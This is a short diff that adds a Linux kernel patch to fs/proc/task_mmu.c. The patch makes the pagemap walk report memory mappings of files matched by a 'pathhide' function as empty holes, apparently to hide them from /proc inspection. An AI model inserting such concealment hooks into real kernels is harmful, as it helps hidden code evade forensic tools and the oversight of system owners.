@@ -1,0 +1,16 @@
+--- a/fs/proc/task_mmu.c
++++ b/fs/proc/task_mmu.c
+@@ -1518,6 +1518,13 @@
+ 	int err = 0;
+ #ifdef CONFIG_TRANSPARENT_HUGEPAGE
+ 	bool migration = false;
++#endif
++	extern bool pathhide_match_file(struct file *file);
++
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return pagemap_pte_hole(addr, end, -1, walk);
++
++#ifdef CONFIG_TRANSPARENT_HUGEPAGE
+ 
+ 	ptl = pmd_trans_huge_lock(pmdp, vma);
+ 	if (ptl) {
